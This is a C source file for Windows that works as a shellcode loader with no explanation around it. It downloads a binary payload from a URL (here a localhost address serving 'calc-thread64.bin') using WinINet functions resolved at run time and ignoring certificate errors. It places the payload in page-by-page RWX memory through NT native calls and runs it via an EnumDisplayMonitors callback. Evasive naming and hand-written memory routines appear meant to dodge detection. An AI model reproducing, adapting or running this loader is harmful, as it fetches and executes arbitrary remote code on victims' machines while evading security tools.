#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include "all.h"


#define NT_SUCCESS(status)	        (((NTSTATUS)(status)) >= 0)

#ifndef STATUS_SUCCESS 
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L) 
#endif

#define PAYLOAD	L"http://127.0.0.1:8080/calc-thread64.bin"

#define	SET_TO_MULTIPLE_OF_4096(X) (((X) + 4095) & (~4095))
#define	PAGE_SIZE 4096

const DWORD AllocationGranularity = 65536;
const DWORD PageSize = 4096;

VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength) {

    PBYTE D = (PBYTE)pDestination;
    PBYTE S = (PBYTE)pSource;

    while (sLength--)
        *D++ = *S++;
}

extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)

void* __cdecl memset(void* Destination, int Value, size_t Size) {
    // logic similar to memset's one
    unsigned char* p = (unsigned char*)Destination;
    while (Size > 0) {
        *p = (unsigned char)Value;
        p++;
        Size--;
    }
    return Destination;
}

unsigned int rand() {
    static unsigned int state = 123456789;
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    return state;
}


typedef HINTERNET(WINAPI* LPINTERNETOPENW)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* LPINTERNETOPENURLW)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* LPINTERNETREADFILE)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* LPINTERNETCLOSEHANDLE)(HINTERNET);
typedef BOOL(WINAPI* LPINTERNETSETOPTIONW)(HINTERNET, DWORD, LPVOID, DWORD);



BOOL GetDataFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    BOOL bSTATE = TRUE;
    HINTERNET hInternet = NULL, hInternetFile = NULL;
    DWORD dwBytesRead = 0;
    SIZE_T sSize = 0;
    PBYTE pBytes = NULL, pTmpBytes = NULL;

    // Dynamically load wininet.dll
    HMODULE hWinInet = LoadLibraryExA("wininet.dll", NULL, 0);
    if (hWinInet == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Retrieve the addresses of the required functions
    LPINTERNETOPENW pInternetOpenW = (LPINTERNETOPENW)GetProcAddress(hWinInet, "InternetOpenW");
    LPINTERNETOPENURLW pInternetOpenUrlW = (LPINTERNETOPENURLW)GetProcAddress(hWinInet, "InternetOpenUrlW");
    LPINTERNETREADFILE pInternetReadFile = (LPINTERNETREADFILE)GetProcAddress(hWinInet, "InternetReadFile");
    LPINTERNETCLOSEHANDLE pInternetCloseHandle = (LPINTERNETCLOSEHANDLE)GetProcAddress(hWinInet, "InternetCloseHandle");
    LPINTERNETSETOPTIONW pInternetSetOptionW = (LPINTERNETSETOPTIONW)GetProcAddress(hWinInet, "InternetSetOptionW");

    if (!pInternetOpenW || !pInternetOpenUrlW || !pInternetReadFile || !pInternetCloseHandle || !pInternetSetOptionW) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Use the function pointers to call the WinINet functions
    hInternet = pInternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    hInternetFile = pInternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
    if (hInternetFile == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {
        if (!pInternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        sSize += dwBytesRead;
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        Memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, 0, dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        pInternetCloseHandle(hInternet);
    if (hInternetFile)
        pInternetCloseHandle(hInternetFile);
    if (hWinInet)
        FreeLibrary(hWinInet);
    if (pTmpBytes)
        LocalFree(pTmpBytes);

    return bSTATE;
}

BOOL LightWork(IN HANDLE hProcess, IN PVOID pPeople, IN SIZE_T sPeopleSize) {
	NTSTATUS STATUS = 0x00;
	SIZE_T sNewPayloadSize = SET_TO_MULTIPLE_OF_4096(sPeopleSize);
	SIZE_T sChunkSize = PAGE_SIZE;
	DWORD ii = sNewPayloadSize / PAGE_SIZE;
	DWORD dwOldPermissions = 0x00;
	PVOID pAddress = NULL, pTmpAddress = NULL;
	PBYTE pTmpPeople = (PBYTE)pPeople;
	HANDLE hThread = NULL;

	sNewPayloadSize += PAGE_SIZE;

	if ((STATUS = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY) != 0x00)) {
		return 1;
	}
	sNewPayloadSize -= PAGE_SIZE;
	pAddress = (PVOID)((ULONG_PTR)pAddress + PAGE_SIZE);
	pTmpAddress = pAddress;

	for (DWORD i = 0; i < ii; i++) {
		STATUS = NtAllocateVirtualMemory(hProcess, &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE);
		if (!NT_SUCCESS(STATUS)) {
			return FALSE;
		}
		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

	pTmpAddress = pAddress;
	for (DWORD i = 0; i < ii; i++) {
		STATUS = NtProtectVirtualMemory(hProcess, &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions);
		if (!NT_SUCCESS(STATUS)) {
			return FALSE;
		}
		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}


	pTmpAddress = pAddress;
	for (DWORD i = 0; i < ii; i++) {
		Memcpy(pTmpAddress, pTmpPeople, PAGE_SIZE);
		pTmpPeople = (PBYTE)((ULONG_PTR)pTmpPeople + PAGE_SIZE);
		pTmpAddress = (PBYTE)((ULONG_PTR)pTmpAddress + PAGE_SIZE);
	}

	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)pAddress, NULL);

}

int main() {
	HANDLE hProcess = (HANDLE)-1;
	PBYTE Bytes = NULL;
	SIZE_T sPeopleSize;  // Initialize it with the actual payload size
	
	GetDataFromUrl(PAYLOAD, &Bytes, &sPeopleSize);
	
	if (!LightWork(hProcess, Bytes, sPeopleSize)) {
		return -1;
	}

	return 0;
}